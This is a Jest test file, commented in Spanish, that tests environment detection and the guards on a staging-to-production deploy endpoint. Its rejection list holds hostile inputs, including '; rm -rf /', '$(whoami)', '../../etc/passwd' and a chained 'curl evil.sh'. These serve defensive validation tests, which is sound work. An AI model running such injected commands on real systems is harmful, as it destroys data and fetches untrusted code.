import { describe, it, expect, beforeEach, afterAll } from '@jest/globals';

/**
 * Las guardas del botón que publica.
 *
 * Este es el único endpoint de la aplicación que ejecuta comandos en el
 * servidor, así que lo que se prueba acá no es el camino feliz —ese termina
 * reiniciando producción y no se simula— sino todas las formas de decir que no.
 *
 * Lo que importa de cada caso:
 *  - Un SHA que no es un SHA nunca llega a la línea de comandos.
 *  - Un SHA válido que NO es el que corre esta instancia se rechaza: significa
 *    que staging se movió entre que el humano miró la pantalla y apretó el
 *    botón, y entonces no probó lo que está por publicar.
 *  - Fuera de staging no se promueve, aunque alguien alcance la función.
 */

const APP_ENV_ORIGINAL = process.env.APP_ENV;
const NODE_ENV_ORIGINAL = process.env.NODE_ENV;

const cargar = () => import('../server/services/deployInfo.js');

afterAll(() => {
  process.env.APP_ENV = APP_ENV_ORIGINAL;
  process.env.NODE_ENV = NODE_ENV_ORIGINAL;
});

describe('de qué entorno se trata', () => {
  beforeEach(() => {
    delete process.env.APP_ENV;
    process.env.NODE_ENV = 'test';
  });

  it('sin APP_ENV, cae en NODE_ENV', async () => {
    const { entorno } = await cargar();
    expect(entorno()).toBe('desarrollo');

    process.env.NODE_ENV = 'production';
    expect(entorno()).toBe('produccion');
  });

  it('APP_ENV=staging gana sobre NODE_ENV=production', async () => {
    // Es el caso que justifica tener dos variables: staging TIENE que correr
    // con el build de producción, así que NODE_ENV no alcanza para
    // distinguirlo.
    process.env.NODE_ENV = 'production';
    process.env.APP_ENV = 'staging';

    const { entorno, esStaging } = await cargar();
    expect(entorno()).toBe('staging');
    expect(esStaging()).toBe(true);
  });

  it('acepta el nombre del entorno en los dos idiomas', async () => {
    const { entorno } = await cargar();
    for (const [valor, esperado] of [
      ['production', 'produccion'],
      ['produccion', 'produccion'],
      ['PRODUCTION', 'produccion'],
      ['  Staging ', 'staging'],
      ['development', 'desarrollo'],
    ] as const) {
      process.env.APP_ENV = valor;
      expect(entorno()).toBe(esperado);
    }
  });

  it('un APP_ENV que no significa nada no convierte la instancia en staging', async () => {
    process.env.NODE_ENV = 'production';
    process.env.APP_ENV = 'prod-2'; // dedazo plausible
    const { entorno, esStaging } = await cargar();

    // Lo importante no es que diga "produccion": es que NO diga "staging". Una
    // variable mal escrita no puede abrir el endpoint que publica.
    expect(esStaging()).toBe(false);
    expect(entorno()).toBe('produccion');
  });
});

describe('qué se publica hacia afuera', () => {
  beforeEach(() => {
    delete process.env.APP_ENV;
  });

  it('en producción no se expone el commit', async () => {
    process.env.APP_ENV = 'production';
    const { infoDeDespliegue } = await cargar();
    const info = await infoDeDespliegue();

    expect(info.entorno).toBe('produccion');
    expect(info.commit).toBeUndefined();
    expect(info.rama).toBeUndefined();
  });

  it('en staging sí, que es para lo que sirve la barra', async () => {
    process.env.APP_ENV = 'staging';
    const { infoDeDespliegue } = await cargar();
    const info = await infoDeDespliegue();

    expect(info.entorno).toBe('staging');
    // En un checkout de git esto viene; en un tarball sin `.git`, no, y
    // devolver "no sé" es correcto: un servidor no se cae por no poder leer su
    // propio número de versión.
    if (info.commit) {
      expect(info.commit).toMatch(/^[0-9a-f]{40}$/);
      expect(info.commitCorto).toBe(info.commit.slice(0, 7));
    }
  });
});

describe('promover: todas las formas de decir que no', () => {
  const BASURA = [
    '',
    '   ',
    'master',
    'HEAD',
    'abc',
    '../../etc/passwd',
    '; rm -rf /',
    '$(whoami)',
    '`id`',
    'a'.repeat(39),
    'a'.repeat(41),
    'z'.repeat(40), // 40 caracteres, pero no son hexadecimales
    'A'.repeat(40) + ' && curl evil.sh',
  ];

  it('nada que no sea un SHA de 40 hexadecimales llega al script', async () => {
    process.env.APP_ENV = 'staging';
    const { promoverAProduccion } = await cargar();

    for (const malo of BASURA) {
      await expect(promoverAProduccion(malo as string)).rejects.toThrow(
        /no es un SHA de git válido/,
      );
    }
  });

  it('no acepta null ni undefined', async () => {
    process.env.APP_ENV = 'staging';
    const { promoverAProduccion } = await cargar();

    await expect(promoverAProduccion(null as any)).rejects.toThrow(/SHA/);
    await expect(promoverAProduccion(undefined as any)).rejects.toThrow(/SHA/);
  });

  it('un SHA bien formado que no es el que corre se rechaza', async () => {
    process.env.APP_ENV = 'staging';
    const { promoverAProduccion, commitActual } = await cargar();

    const actual = await commitActual();
    if (!actual) return; // sin .git no hay nada que comparar

    const otro = 'f'.repeat(40) === actual.sha ? 'e'.repeat(40) : 'f'.repeat(40);
    await expect(promoverAProduccion(otro)).rejects.toThrow(/Staging está corriendo/);
  });

  it('fuera de staging no se promueve, aunque el SHA sea el correcto', async () => {
    const { commitActual } = await cargar();
    const actual = await commitActual();

    for (const env of ['production', 'development']) {
      process.env.APP_ENV = env;
      const { promoverAProduccion } = await cargar();
      await expect(promoverAProduccion(actual?.sha || 'a'.repeat(40))).rejects.toThrow(
        /sólo se puede desde staging/,
      );
    }
  });
});
